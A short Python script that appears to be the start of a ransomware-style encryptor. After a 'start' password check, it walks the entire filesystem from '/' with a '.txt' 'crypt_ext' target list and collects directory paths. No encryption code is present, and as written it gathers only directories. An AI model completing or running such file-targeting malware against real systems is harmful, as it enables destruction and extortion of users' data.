#!/bin/python

import os

# Safeguard
safeguard = input("Password: ")

if safeguard != 'start':
    quit()

# Iterate
crypt_ext = ('.txt',)
root_dir = '/'

file_paths = []
for dir_path, dirs, files in os.walk(root_dir):
    file_paths.append(dir_path)
